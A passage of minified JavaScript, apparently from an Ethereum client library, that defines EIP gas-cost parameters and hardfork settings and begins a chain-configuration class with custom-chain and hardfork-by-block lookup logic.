                    v: 2400,
                    d: "Gas cost per storage key in an Access List transaction"
                }
            },
            vm: {},
            pow: {}
        },
        g8 = {
            name: "EIP-3198",
            number: 3198,
            comment: "BASEFEE opcode",
            url: "https://eips.ethereum.org/EIPS/eip-3198",
            status: "Final",
            minimumHardfork: "london",
            gasConfig: {},
            gasPrices: {
                basefee: {
                    v: 2,
                    d: "Gas cost of the BASEFEE opcode"
                }
            },
            vm: {},
            pow: {}
        },
        v8 = {
            name: "EIP-3529",
            comment: "Reduction in refunds",
            url: "https://eips.ethereum.org/EIPS/eip-3529",
            status: "Final",
            minimumHardfork: "berlin",
            requiredEIPs: [2929],
            gasConfig: {
                maxRefundQuotient: {
                    v: 5,
                    d: "Maximum refund quotient; max tx refund is min(tx.gasUsed/maxRefundQuotient, tx.gasRefund)"
                }
            },
            gasPrices: {
                selfdestructRefund: {
                    v: 0,
                    d: "Refunded following a selfdestruct operation"
                },
                sstoreClearRefundEIP2200: {
                    v: 4800,
                    d: "Once per SSTORE operation for clearing an originally existing storage slot"
                }
            },
            vm: {},
            pow: {}
        },
        y8 = {
            name: "EIP-3540",
            number: 3540,
            comment: "EVM Object Format (EOF) v1",
            url: "https://eips.ethereum.org/EIPS/eip-3540",
            status: "Review",
            minimumHardfork: "london",
            requiredEIPs: [3541],
            gasConfig: {},
            gasPrices: {},
            vm: {},
            pow: {}
        },
        w8 = {
            name: "EIP-3541",
            comment: "Reject new contracts starting with the 0xEF byte",
            url: "https://eips.ethereum.org/EIPS/eip-3541",
            status: "Final",
            minimumHardfork: "berlin",
            requiredEIPs: [],
            gasConfig: {},
            gasPrices: {},
            vm: {},
            pow: {}
        },
        b8 = {
            name: "EIP-3554",
            comment: "Reduction in refunds",
            url: "Difficulty Bomb Delay to December 1st 2021",
            status: "Final",
            minimumHardfork: "muirGlacier",
            requiredEIPs: [],
            gasConfig: {},
            gasPrices: {},
            vm: {},
            pow: {
                difficultyBombDelay: {
                    v: 95e5,
                    d: "the amount of blocks to delay the difficulty bomb with"
                }
            }
        },
        x8 = {
            name: "EIP-3607",
            number: 3607,
            comment: "Reject transactions from senders with deployed code",
            url: "https://eips.ethereum.org/EIPS/eip-3607",
            status: "Final",
            minimumHardfork: "chainstart",
            requiredEIPs: [],
            gasConfig: {},
            gasPrices: {},
            vm: {},
            pow: {}
        },
        E8 = {
            name: "EIP-3651",
            number: 3198,
            comment: "Warm COINBASE",
            url: "https://eips.ethereum.org/EIPS/eip-3651",
            status: "Review",
            minimumHardfork: "london",
            requiredEIPs: [2929],
            gasConfig: {},
            gasPrices: {},
            vm: {},
            pow: {}
        },
        A8 = {
            name: "EIP-3670",
            number: 3670,
            comment: "EOF - Code Validation",
            url: "https://eips.ethereum.org/EIPS/eip-3670",
            status: "Review",
            minimumHardfork: "london",
            requiredEIPs: [3540],
            gasConfig: {},
            gasPrices: {},
            vm: {},
            pow: {}
        },
        _8 = {
            name: "EIP-3675",
            number: 3675,
            comment: "Upgrade consensus to Proof-of-Stake",
            url: "https://eips.ethereum.org/EIPS/eip-3675",
            status: "Final",
            minimumHardfork: "london",
            requiredEIPs: [],
            gasConfig: {},
            gasPrices: {},
            vm: {},
            pow: {}
        },
        S8 = {
            name: "EIP-3855",
            number: 3855,
            comment: "PUSH0 instruction",
            url: "https://eips.ethereum.org/EIPS/eip-3855",
            status: "Review",
            minimumHardfork: "chainstart",
            requiredEIPs: [],
            gasConfig: {},
            gasPrices: {
                push0: {
                    v: 2,
                    d: "Base fee of the PUSH0 opcode"
                }
            },
            vm: {},
            pow: {}
        },
        k8 = {
            name: "EIP-3860",
            number: 3860,
            comment: "Limit and meter initcode",
            url: "https://eips.ethereum.org/EIPS/eip-3860",
            status: "Review",
            minimumHardfork: "spuriousDragon",
            requiredEIPs: [],
            gasConfig: {},
            gasPrices: {
                initCodeWordCost: {
                    v: 2,
                    d: "Gas to pay for each word (32 bytes) of initcode when creating a contract"
                }
            },
            vm: {
                maxInitCodeSize: {
                    v: 49152,
                    d: "Maximum length of initialization code when creating a contract"
                }
            },
            pow: {}
        },
        T8 = {
            name: "EIP-4345",
            number: 4345,
            comment: "Difficulty Bomb Delay to June 2022",
            url: "https://eips.ethereum.org/EIPS/eip-4345",
            status: "Final",
            minimumHardfork: "london",
            gasConfig: {},
            gasPrices: {},
            vm: {},
            pow: {
                difficultyBombDelay: {
                    v: 107e5,
                    d: "the amount of blocks to delay the difficulty bomb with"
                }
            }
        },
        I8 = {
            name: "EIP-4399",
            number: 4399,
            comment: "Supplant DIFFICULTY opcode with PREVRANDAO",
            url: "https://eips.ethereum.org/EIPS/eip-4399",
            status: "Review",
            minimumHardfork: "london",
            requiredEIPs: [],
            gasConfig: {},
            gasPrices: {},
            vm: {},
            pow: {}
        },
        C8 = {
            name: "EIP-5133",
            number: 5133,
            comment: "Delaying Difficulty Bomb to mid-September 2022",
            url: "https://eips.ethereum.org/EIPS/eip-5133",
            status: "Draft",
            minimumHardfork: "grayGlacier",
            gasConfig: {},
            gasPrices: {},
            vm: {},
            pow: {
                difficultyBombDelay: {
                    v: 114e5,
                    d: "the amount of blocks to delay the difficulty bomb with"
                }
            }
        },
        ko = {
            1153: l8,
            1559: c8,
            2315: u8,
            2537: d8,
            2565: f8,
            2718: h8,
            2929: p8,
            2930: m8,
            3198: g8,
            3529: v8,
            3540: y8,
            3541: w8,
            3554: b8,
            3607: x8,
            3651: E8,
            3670: A8,
            3675: _8,
            3855: S8,
            3860: k8,
            4345: T8,
            4399: I8,
            5133: C8
        },
        P8 = {
            name: "chainstart",
            comment: "Start of the Ethereum main chain",
            url: "",
            status: "",
            gasConfig: {
                minGasLimit: {
                    v: 5e3,
                    d: "Minimum the gas limit may ever be"
                },
                gasLimitBoundDivisor: {
                    v: 1024,
                    d: "The bound divisor of the gas limit, used in update calculations"
                },
                maxRefundQuotient: {
                    v: 2,
                    d: "Maximum refund quotient; max tx refund is min(tx.gasUsed/maxRefundQuotient, tx.gasRefund)"
                }
            },
            gasPrices: {
                base: {
                    v: 2,
                    d: "Gas base cost, used e.g. for ChainID opcode (Istanbul)"
                },
                tierStep: {
                    v: [0, 2, 3, 5, 8, 10, 20],
                    d: "Once per operation, for a selection of them"
                },
                exp: {
                    v: 10,
                    d: "Base fee of the EXP opcode"
                },
                expByte: {
                    v: 10,
                    d: "Times ceil(log256(exponent)) for the EXP instruction"
                },
                sha3: {
                    v: 30,
                    d: "Base fee of the SHA3 opcode"
                },
                sha3Word: {
                    v: 6,
                    d: "Once per word of the SHA3 operation's data"
                },
                sload: {
                    v: 50,
                    d: "Base fee of the SLOAD opcode"
                },
                sstoreSet: {
                    v: 2e4,
                    d: "Once per SSTORE operation if the zeroness changes from zero"
                },
                sstoreReset: {
                    v: 5e3,
                    d: "Once per SSTORE operation if the zeroness does not change from zero"
                },
                sstoreRefund: {
                    v: 15e3,
                    d: "Once per SSTORE operation if the zeroness changes to zero"
                },
                jumpdest: {
                    v: 1,
                    d: "Base fee of the JUMPDEST opcode"
                },
                log: {
                    v: 375,
                    d: "Base fee of the LOG opcode"
                },
                logData: {
                    v: 8,
                    d: "Per byte in a LOG* operation's data"
                },
                logTopic: {
                    v: 375,
                    d: "Multiplied by the * of the LOG*, per LOG transaction. e.g. LOG0 incurs 0 * c_txLogTopicGas, LOG4 incurs 4 * c_txLogTopicGas"
                },
                create: {
                    v: 32e3,
                    d: "Base fee of the CREATE opcode"
                },
                call: {
                    v: 40,
                    d: "Base fee of the CALL opcode"
                },
                callStipend: {
                    v: 2300,
                    d: "Free gas given at beginning of call"
                },
                callValueTransfer: {
                    v: 9e3,
                    d: "Paid for CALL when the value transfor is non-zero"
                },
                callNewAccount: {
                    v: 25e3,
                    d: "Paid for CALL when the destination address didn't exist prior"
                },
                selfdestructRefund: {
                    v: 24e3,
                    d: "Refunded following a selfdestruct operation"
                },
                memory: {
                    v: 3,
                    d: "Times the address of the (highest referenced byte in memory + 1). NOTE: referencing happens on read, write and in instructions such as RETURN and CALL"
                },
                quadCoeffDiv: {
                    v: 512,
                    d: "Divisor for the quadratic particle of the memory cost equation"
                },
                createData: {
                    v: 200,
                    d: ""
                },
                tx: {
                    v: 21e3,
                    d: "Per transaction. NOTE: Not payable on data of calls between transactions"
                },
                txCreation: {
                    v: 32e3,
                    d: "The cost of creating a contract via tx"
                },
                txDataZero: {
                    v: 4,
                    d: "Per byte of data attached to a transaction that equals zero. NOTE: Not payable on data of calls between transactions"
                },
                txDataNonZero: {
                    v: 68,
                    d: "Per byte of data attached to a transaction that is not equal to zero. NOTE: Not payable on data of calls between transactions"
                },
                copy: {
                    v: 3,
                    d: "Multiplied by the number of 32-byte words that are copied (round up) for any *COPY operation and added"
                },
                ecRecover: {
                    v: 3e3,
                    d: ""
                },
                sha256: {
                    v: 60,
                    d: ""
                },
                sha256Word: {
                    v: 12,
                    d: ""
                },
                ripemd160: {
                    v: 600,
                    d: ""
                },
                ripemd160Word: {
                    v: 120,
                    d: ""
                },
                identity: {
                    v: 15,
                    d: ""
                },
                identityWord: {
                    v: 3,
                    d: ""
                },
                stop: {
                    v: 0,
                    d: "Base fee of the STOP opcode"
                },
                add: {
                    v: 3,
                    d: "Base fee of the ADD opcode"
                },
                mul: {
                    v: 5,
                    d: "Base fee of the MUL opcode"
                },
                sub: {
                    v: 3,
                    d: "Base fee of the SUB opcode"
                },
                div: {
                    v: 5,
                    d: "Base fee of the DIV opcode"
                },
                sdiv: {
                    v: 5,
                    d: "Base fee of the SDIV opcode"
                },
                mod: {
                    v: 5,
                    d: "Base fee of the MOD opcode"
                },
                smod: {
                    v: 5,
                    d: "Base fee of the SMOD opcode"
                },
                addmod: {
                    v: 8,
                    d: "Base fee of the ADDMOD opcode"
                },
                mulmod: {
                    v: 8,
                    d: "Base fee of the MULMOD opcode"
                },
                signextend: {
                    v: 5,
                    d: "Base fee of the SIGNEXTEND opcode"
                },
                lt: {
                    v: 3,
                    d: "Base fee of the LT opcode"
                },
                gt: {
                    v: 3,
                    d: "Base fee of the GT opcode"
                },
                slt: {
                    v: 3,
                    d: "Base fee of the SLT opcode"
                },
                sgt: {
                    v: 3,
                    d: "Base fee of the SGT opcode"
                },
                eq: {
                    v: 3,
                    d: "Base fee of the EQ opcode"
                },
                iszero: {
                    v: 3,
                    d: "Base fee of the ISZERO opcode"
                },
                and: {
                    v: 3,
                    d: "Base fee of the AND opcode"
                },
                or: {
                    v: 3,
                    d: "Base fee of the OR opcode"
                },
                xor: {
                    v: 3,
                    d: "Base fee of the XOR opcode"
                },
                not: {
                    v: 3,
                    d: "Base fee of the NOT opcode"
                },
                byte: {
                    v: 3,
                    d: "Base fee of the BYTE opcode"
                },
                address: {
                    v: 2,
                    d: "Base fee of the ADDRESS opcode"
                },
                balance: {
                    v: 20,
                    d: "Base fee of the BALANCE opcode"
                },
                origin: {
                    v: 2,
                    d: "Base fee of the ORIGIN opcode"
                },
                caller: {
                    v: 2,
                    d: "Base fee of the CALLER opcode"
                },
                callvalue: {
                    v: 2,
                    d: "Base fee of the CALLVALUE opcode"
                },
                calldataload: {
                    v: 3,
                    d: "Base fee of the CALLDATALOAD opcode"
                },
                calldatasize: {
                    v: 2,
                    d: "Base fee of the CALLDATASIZE opcode"
                },
                calldatacopy: {
                    v: 3,
                    d: "Base fee of the CALLDATACOPY opcode"
                },
                codesize: {
                    v: 2,
                    d: "Base fee of the CODESIZE opcode"
                },
                codecopy: {
                    v: 3,
                    d: "Base fee of the CODECOPY opcode"
                },
                gasprice: {
                    v: 2,
                    d: "Base fee of the GASPRICE opcode"
                },
                extcodesize: {
                    v: 20,
                    d: "Base fee of the EXTCODESIZE opcode"
                },
                extcodecopy: {
                    v: 20,
                    d: "Base fee of the EXTCODECOPY opcode"
                },
                blockhash: {
                    v: 20,
                    d: "Base fee of the BLOCKHASH opcode"
                },
                coinbase: {
                    v: 2,
                    d: "Base fee of the COINBASE opcode"
                },
                timestamp: {
                    v: 2,
                    d: "Base fee of the TIMESTAMP opcode"
                },
                number: {
                    v: 2,
                    d: "Base fee of the NUMBER opcode"
                },
                difficulty: {
                    v: 2,
                    d: "Base fee of the DIFFICULTY opcode"
                },
                gaslimit: {
                    v: 2,
                    d: "Base fee of the GASLIMIT opcode"
                },
                pop: {
                    v: 2,
                    d: "Base fee of the POP opcode"
                },
                mload: {
                    v: 3,
                    d: "Base fee of the MLOAD opcode"
                },
                mstore: {
                    v: 3,
                    d: "Base fee of the MSTORE opcode"
                },
                mstore8: {
                    v: 3,
                    d: "Base fee of the MSTORE8 opcode"
                },
                sstore: {
                    v: 0,
                    d: "Base fee of the SSTORE opcode"
                },
                jump: {
                    v: 8,
                    d: "Base fee of the JUMP opcode"
                },
                jumpi: {
                    v: 10,
                    d: "Base fee of the JUMPI opcode"
                },
                pc: {
                    v: 2,
                    d: "Base fee of the PC opcode"
                },
                msize: {
                    v: 2,
                    d: "Base fee of the MSIZE opcode"
                },
                gas: {
                    v: 2,
                    d: "Base fee of the GAS opcode"
                },
                push: {
                    v: 3,
                    d: "Base fee of the PUSH opcode"
                },
                dup: {
                    v: 3,
                    d: "Base fee of the DUP opcode"
                },
                swap: {
                    v: 3,
                    d: "Base fee of the SWAP opcode"
                },
                callcode: {
                    v: 40,
                    d: "Base fee of the CALLCODE opcode"
                },
                return: {
                    v: 0,
                    d: "Base fee of the RETURN opcode"
                },
                invalid: {
                    v: 0,
                    d: "Base fee of the INVALID opcode"
                },
                selfdestruct: {
                    v: 0,
                    d: "Base fee of the SELFDESTRUCT opcode"
                }
            },
            vm: {
                stackLimit: {
                    v: 1024,
                    d: "Maximum size of VM stack allowed"
                },
                callCreateDepth: {
                    v: 1024,
                    d: "Maximum depth of call/create stack"
                },
                maxExtraDataSize: {
                    v: 32,
                    d: "Maximum size extra data may be after Genesis"
                }
            },
            pow: {
                minimumDifficulty: {
                    v: 131072,
                    d: "The minimum that the difficulty may ever be"
                },
                difficultyBoundDivisor: {
                    v: 2048,
                    d: "The bound divisor of the difficulty, used in the update calculations"
                },
                durationLimit: {
                    v: 13,
                    d: "The decision boundary on the blocktime duration used to determine whether difficulty should go up or not"
                },
                epochDuration: {
                    v: 3e4,
                    d: "Duration between proof-of-work epochs"
                },
                timebombPeriod: {
                    v: 1e5,
                    d: "Exponential difficulty timebomb period"
                },
                minerReward: {
                    v: "5000000000000000000",
                    d: "the amount a miner get rewarded for mining a block"
                },
                difficultyBombDelay: {
                    v: 0,
                    d: "the amount of blocks to delay the difficulty bomb with"
                }
            }
        },
        R8 = {
            name: "dao",
            comment: "DAO rescue hardfork",
            url: "https://eips.ethereum.org/EIPS/eip-779",
            status: "Final",
            gasConfig: {},
            gasPrices: {},
            vm: {},
            pow: {}
        },
        N8 = {
            name: "homestead",
            comment: "Homestead hardfork with protocol and network changes",
            url: "https://eips.ethereum.org/EIPS/eip-606",
            status: "Final",
            gasConfig: {},
            gasPrices: {
                delegatecall: {
                    v: 40,
                    d: "Base fee of the DELEGATECALL opcode"
                }
            },
            vm: {},
            pow: {}
        },
        B8 = {
            name: "tangerineWhistle",
            comment: "Hardfork with gas cost changes for IO-heavy operations",
            url: "https://eips.ethereum.org/EIPS/eip-608",
            status: "Final",
            gasConfig: {},
            gasPrices: {
                sload: {
                    v: 200,
                    d: "Once per SLOAD operation"
                },
                call: {
                    v: 700,
                    d: "Once per CALL operation & message call transaction"
                },
                extcodesize: {
                    v: 700,
                    d: "Base fee of the EXTCODESIZE opcode"
                },
                extcodecopy: {
                    v: 700,
                    d: "Base fee of the EXTCODECOPY opcode"
                },
                balance: {
                    v: 400,
                    d: "Base fee of the BALANCE opcode"
                },
                delegatecall: {
                    v: 700,
                    d: "Base fee of the DELEGATECALL opcode"
                },
                callcode: {
                    v: 700,
                    d: "Base fee of the CALLCODE opcode"
                },
                selfdestruct: {
                    v: 5e3,
                    d: "Base fee of the SELFDESTRUCT opcode"
                }
            },
            vm: {},
            pow: {}
        },
        M8 = {
            name: "spuriousDragon",
            comment: "HF with EIPs for simple replay attack protection, EXP cost increase, state trie clearing, contract code size limit",
            url: "https://eips.ethereum.org/EIPS/eip-607",
            status: "Final",
            gasConfig: {},
            gasPrices: {
                expByte: {
                    v: 50,
                    d: "Times ceil(log256(exponent)) for the EXP instruction"
                }
            },
            vm: {
                maxCodeSize: {
                    v: 24576,
                    d: "Maximum length of contract code"
                }
            },
            pow: {}
        },
        O8 = {
            name: "byzantium",
            comment: "Hardfork with new precompiles, instructions and other protocol changes",
            url: "https://eips.ethereum.org/EIPS/eip-609",
            status: "Final",
            gasConfig: {},
            gasPrices: {
                modexpGquaddivisor: {
                    v: 20,
                    d: "Gquaddivisor from modexp precompile for gas calculation"
                },
                ecAdd: {
                    v: 500,
                    d: "Gas costs for curve addition precompile"
                },
                ecMul: {
                    v: 4e4,
                    d: "Gas costs for curve multiplication precompile"
                },
                ecPairing: {
                    v: 1e5,
                    d: "Base gas costs for curve pairing precompile"
                },
                ecPairingWord: {
                    v: 8e4,
                    d: "Gas costs regarding curve pairing precompile input length"
                },
                revert: {
                    v: 0,
                    d: "Base fee of the REVERT opcode"
                },
                staticcall: {
                    v: 700,
                    d: "Base fee of the STATICCALL opcode"
                },
                returndatasize: {
                    v: 2,
                    d: "Base fee of the RETURNDATASIZE opcode"
                },
                returndatacopy: {
                    v: 3,
                    d: "Base fee of the RETURNDATACOPY opcode"
                }
            },
            vm: {},
            pow: {
                minerReward: {
                    v: "3000000000000000000",
                    d: "the amount a miner get rewarded for mining a block"
                },
                difficultyBombDelay: {
                    v: 3e6,
                    d: "the amount of blocks to delay the difficulty bomb with"
                }
            }
        },
        L8 = {
            name: "constantinople",
            comment: "Postponed hardfork including EIP-1283 (SSTORE gas metering changes)",
            url: "https://eips.ethereum.org/EIPS/eip-1013",
            status: "Final",
            gasConfig: {},
            gasPrices: {
                netSstoreNoopGas: {
                    v: 200,
                    d: "Once per SSTORE operation if the value doesn't change"
                },
                netSstoreInitGas: {
                    v: 2e4,
                    d: "Once per SSTORE operation from clean zero"
                },
                netSstoreCleanGas: {
                    v: 5e3,
                    d: "Once per SSTORE operation from clean non-zero"
                },
                netSstoreDirtyGas: {
                    v: 200,
                    d: "Once per SSTORE operation from dirty"
                },
                netSstoreClearRefund: {
                    v: 15e3,
                    d: "Once per SSTORE operation for clearing an originally existing storage slot"
                },
                netSstoreResetRefund: {
                    v: 4800,
                    d: "Once per SSTORE operation for resetting to the original non-zero value"
                },
                netSstoreResetClearRefund: {
                    v: 19800,
                    d: "Once per SSTORE operation for resetting to the original zero value"
                },
                shl: {
                    v: 3,
                    d: "Base fee of the SHL opcode"
                },
                shr: {
                    v: 3,
                    d: "Base fee of the SHR opcode"
                },
                sar: {
                    v: 3,
                    d: "Base fee of the SAR opcode"
                },
                extcodehash: {
                    v: 400,
                    d: "Base fee of the EXTCODEHASH opcode"
                },
                create2: {
                    v: 32e3,
                    d: "Base fee of the CREATE2 opcode"
                }
            },
            vm: {},
            pow: {
                minerReward: {
                    v: "2000000000000000000",
                    d: "The amount a miner gets rewarded for mining a block"
                },
                difficultyBombDelay: {
                    v: 5e6,
                    d: "the amount of blocks to delay the difficulty bomb with"
                }
            }
        },
        F8 = {
            name: "petersburg",
            comment: "Aka constantinopleFix, removes EIP-1283, activate together with or after constantinople",
            url: "https://eips.ethereum.org/EIPS/eip-1716",
            status: "Final",
            gasConfig: {},
            gasPrices: {
                netSstoreNoopGas: {
                    v: null,
                    d: "Removed along EIP-1283"
                },
                netSstoreInitGas: {
                    v: null,
                    d: "Removed along EIP-1283"
                },
                netSstoreCleanGas: {
                    v: null,
                    d: "Removed along EIP-1283"
                },
                netSstoreDirtyGas: {
                    v: null,
                    d: "Removed along EIP-1283"
                },
                netSstoreClearRefund: {
                    v: null,
                    d: "Removed along EIP-1283"
                },
                netSstoreResetRefund: {
                    v: null,
                    d: "Removed along EIP-1283"
                },
                netSstoreResetClearRefund: {
                    v: null,
                    d: "Removed along EIP-1283"
                }
            },
            vm: {},
            pow: {}
        },
        D8 = {
            name: "istanbul",
            comment: "HF targeted for December 2019 following the Constantinople/Petersburg HF",
            url: "https://eips.ethereum.org/EIPS/eip-1679",
            status: "Final",
            gasConfig: {},
            gasPrices: {
                blake2Round: {
                    v: 1,
                    d: "Gas cost per round for the Blake2 F precompile"
                },
                ecAdd: {
                    v: 150,
                    d: "Gas costs for curve addition precompile"
                },
                ecMul: {
                    v: 6e3,
                    d: "Gas costs for curve multiplication precompile"
                },
                ecPairing: {
                    v: 45e3,
                    d: "Base gas costs for curve pairing precompile"
                },
                ecPairingWord: {
                    v: 34e3,
                    d: "Gas costs regarding curve pairing precompile input length"
                },
                txDataNonZero: {
                    v: 16,
                    d: "Per byte of data attached to a transaction that is not equal to zero. NOTE: Not payable on data of calls between transactions"
                },
                sstoreSentryGasEIP2200: {
                    v: 2300,
                    d: "Minimum gas required to be present for an SSTORE call, not consumed"
                },
                sstoreNoopGasEIP2200: {
                    v: 800,
                    d: "Once per SSTORE operation if the value doesn't change"
                },
                sstoreDirtyGasEIP2200: {
                    v: 800,
                    d: "Once per SSTORE operation if a dirty value is changed"
                },
                sstoreInitGasEIP2200: {
                    v: 2e4,
                    d: "Once per SSTORE operation from clean zero to non-zero"
                },
                sstoreInitRefundEIP2200: {
                    v: 19200,
                    d: "Once per SSTORE operation for resetting to the original zero value"
                },
                sstoreCleanGasEIP2200: {
                    v: 5e3,
                    d: "Once per SSTORE operation from clean non-zero to something else"
                },
                sstoreCleanRefundEIP2200: {
                    v: 4200,
                    d: "Once per SSTORE operation for resetting to the original non-zero value"
                },
                sstoreClearRefundEIP2200: {
                    v: 15e3,
                    d: "Once per SSTORE operation for clearing an originally existing storage slot"
                },
                balance: {
                    v: 700,
                    d: "Base fee of the BALANCE opcode"
                },
                extcodehash: {
                    v: 700,
                    d: "Base fee of the EXTCODEHASH opcode"
                },
                chainid: {
                    v: 2,
                    d: "Base fee of the CHAINID opcode"
                },
                selfbalance: {
                    v: 5,
                    d: "Base fee of the SELFBALANCE opcode"
                },
                sload: {
                    v: 800,
                    d: "Base fee of the SLOAD opcode"
                }
            },
            vm: {},
            pow: {}
        },
        j8 = {
            name: "muirGlacier",
            comment: "HF to delay the difficulty bomb",
            url: "https://eips.ethereum.org/EIPS/eip-2384",
            status: "Final",
            gasConfig: {},
            gasPrices: {},
            vm: {},
            pow: {
                difficultyBombDelay: {
                    v: 9e6,
                    d: "the amount of blocks to delay the difficulty bomb with"
                }
            }
        },
        H8 = {
            name: "berlin",
            comment: "HF targeted for July 2020 following the Muir Glacier HF",
            url: "https://eips.ethereum.org/EIPS/eip-2070",
            status: "Final",
            eips: [2565, 2929, 2718, 2930]
        },
        $8 = {
            name: "london",
            comment: "HF targeted for July 2021 following the Berlin fork",
            url: "https://github.com/ethereum/eth1.0-specs/blob/master/network-upgrades/mainnet-upgrades/london.md",
            status: "Final",
            eips: [1559, 3198, 3529, 3541]
        },
        U8 = {
            name: "shanghai",
            comment: "Next feature hardfork after the merge hardfork having withdrawals, warm coinbase, push0, limit/meter initcode",
            url: "https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/shanghai.md",
            status: "Final",
            eips: [3651, 3855, 3860, 4895]
        },
        z8 = {
            name: "arrowGlacier",
            comment: "HF to delay the difficulty bomb",
            url: "https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/arrow-glacier.md",
            status: "Final",
            eips: [4345],
            gasConfig: {},
            gasPrices: {},
            vm: {},
            pow: {}
        },
        G8 = {
            name: "grayGlacier",
            comment: "Delaying the difficulty bomb to Mid September 2022",
            url: "https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/gray-glacier.md",
            status: "Draft",
            eips: [5133],
            gasConfig: {},
            gasPrices: {},
            vm: {},
            pow: {}
        },
        V8 = {
            name: "mergeForkIdTransition",
            comment: "Pre-merge hardfork to fork off non-upgraded clients",
            url: "https://eips.ethereum.org/EIPS/eip-3675",
            status: "Draft",
            eips: []
        },
        W8 = {
            name: "merge",
            comment: "Hardfork to upgrade the consensus mechanism to Proof-of-Stake",
            url: "https://github.com/ethereum/execution-specs/blob/master/network-upgrades/mainnet-upgrades/merge.md",
            status: "Final",
            consensus: {
                type: "pos",
                algorithm: "casper",
                casper: {}
            },
            eips: [3675, 4399]
        },
        q8 = {
            chainstart: P8,
            homestead: N8,
            dao: R8,
            tangerineWhistle: B8,
            spuriousDragon: M8,
            byzantium: O8,
            constantinople: L8,
            petersburg: F8,
            istanbul: D8,
            muirGlacier: j8,
            berlin: H8,
            london: $8,
            shanghai: U8,
            arrowGlacier: z8,
            grayGlacier: G8,
            mergeForkIdTransition: V8,
            merge: W8
        },
        {
            buf: Q8
        } = i8;
    class qe extends M0 {
        constructor(t) {
            var n, r;
            super(), this._eips = [], this._customChains = (n = t.customChains) !== null && n !== void 0 ? n : [], this._chainParams = this.setChain(t.chain), this.DEFAULT_HARDFORK = (r = this._chainParams.defaultHardfork) !== null && r !== void 0 ? r : Se.Merge, this.HARDFORK_CHANGES = this.hardforks().map(i => [i.name, q8[i.name]]), this._hardfork = this.DEFAULT_HARDFORK, t.hardfork !== void 0 && this.setHardfork(t.hardfork), t.eips && this.setEIPs(t.eips)
        }
        static custom(t, n = {}) {
            var r;
            const i = (r = n.baseChain) !== null && r !== void 0 ? r : "mainnet",
                o = Object.assign({}, qe._getChainParams(i));
            if (o.name = "custom-chain", typeof t != "string") return new qe(Object.assign({
                chain: Object.assign(Object.assign({}, o), t)
            }, n));
            if (t === ct.PolygonMainnet) return qe.custom({
                name: ct.PolygonMainnet,
                chainId: 137,
                networkId: 137
            }, n);
            if (t === ct.PolygonMumbai) return qe.custom({
                name: ct.PolygonMumbai,
                chainId: 80001,
                networkId: 80001
            }, n);
            if (t === ct.ArbitrumRinkebyTestnet) return qe.custom({
                name: ct.ArbitrumRinkebyTestnet,
                chainId: 421611,
                networkId: 421611
            }, n);
            if (t === ct.ArbitrumOne) return qe.custom({
                name: ct.ArbitrumOne,
                chainId: 42161,
                networkId: 42161
            }, n);
            if (t === ct.xDaiChain) return qe.custom({
                name: ct.xDaiChain,
                chainId: 100,
                networkId: 100
            }, n);
            if (t === ct.OptimisticKovan) return qe.custom({
                name: ct.OptimisticKovan,
                chainId: 69,
                networkId: 69
            }, Object.assign({
                hardfork: Se.Berlin
            }, n));
            if (t === ct.OptimisticEthereum) return qe.custom({
                name: ct.OptimisticEthereum,
                chainId: 10,
                networkId: 10
            }, Object.assign({
                hardfork: Se.Berlin
            }, n));
            throw new Error(`Custom chain ${t} not supported`)
        }
        static fromGethGenesis(t, {
            chain: n,
            eips: r,
            genesisHash: i,
            hardfork: o,
            mergeForkIdPostMerge: s
        }) {
            var a;
            const l = Q6(t, n, s),
                u = new qe({
                    chain: (a = l.name) !== null && a !== void 0 ? a : "custom",
                    customChains: [l],
                    eips: r,
                    hardfork: o ?? l.hardfork
                });
            return i !== void 0 && u.setForkHashes(i), u
        }
        static isSupportedChainId(t) {
            return !!this._getInitializedChains().names[t.toString()]
        }
        static _getChainParams(t, n) {
            let r = t;
            const i = this._getInitializedChains(n);
            if (typeof r == "number" || typeof r == "bigint") {
                if (r = r.toString(), i.names[r]) {
                    const o = i.names[r];
                    return i[o]
                }
                throw new Error(`Chain with ID ${r} not supported`)
            }
            if (i[r] !== void 0) return i[r];
            throw new Error(`Chain with name ${r} not supported`)
        }
        setChain(t) {
            if (typeof t == "number" || typeof t == "bigint" || typeof t == "string") this._chainParams = qe._getChainParams(t, this._customChains);
            else if (typeof t == "object") {
                if (this._customChains.length > 0) throw new Error("Chain must be a string, number, or bigint when initialized with customChains passed in");
                const n = ["networkId", "genesis", "hardforks", "bootstrapNodes"];
                for (const r of n)
                    if (!(r in t)) throw new Error(`Missing required chain parameter: ${r}`);
                this._chainParams = t
            } else throw new Error("Wrong input format");
            for (const n of this.hardforks())
                if (n.block === void 0) throw new Error("Hardfork cannot have undefined block number");
            return this._chainParams
        }
        setHardfork(t) {
            let n = !1;
            for (const r of this.HARDFORK_CHANGES) r[0] === t && (this._hardfork !== t && (this._hardfork = t, this.emit("hardforkChanged", t)), n = !0);
            if (!n) throw new Error(`Hardfork with name ${t} not supported`)
        }
        getHardforkByBlockNumber(t, n, r) {
            const i = _o(t, cn.BigInt),
                o = _o(n, cn.BigInt),
                s = _o(r, cn.Number),
                a = this.hardforks().filter(h => h.block !== null || h.ttd !== null && h.ttd !== void 0 || h.timestamp !== void 0),
                l = a.findIndex(h => h.ttd !== null && h.ttd !== void 0);
            if (a.slice(l + 1).findIndex(h => h.ttd !== null && h.ttd !== void 0) >= 0) throw Error("More than one merge hardforks found with ttd specified");
            let c = a.findIndex(h => h.block !== null && h.block > i || s !== void 0 && Number(h.timestamp) > s);
            if (c === -1) c = a.length;
            else if (c === 0) throw Error("Must have at least one hardfork at block 0");
            if (s === void 0) {
                const h = a.slice(0, c).reverse().findIndex(v => v.block !== null || v.ttd !== void 0);
                c -= h
            }
            if (c -= 1, a[c].block === null && a[c].timestamp === void 0)(o == null || BigInt(a[c].ttd) > o) && (c -= 1);
            else if (l >= 0 && o !== void 0 && o !== null) {
                if (c >= l && BigInt(a[l].ttd) > o) throw Error("Maximum HF determined by total difficulty is lower than the block number HF");
                if (c < l && BigInt(a[l].ttd) <= o) throw Error("HF determined by block number is lower than the minimum total difficulty HF")
            }
            const d = c;
            for (; c < a.length - 1 && !(a[c].block !== a[c + 1].block || a[c].timestamp !== a[c + 1].timestamp); c += 1);
            if (s) {
                if (a.slice(0, d).reduce((p, w) => {
                        var m;
                        return Math.max(Number((m = w.timestamp) !== null && m !== void 0 ? m : "0"), p)
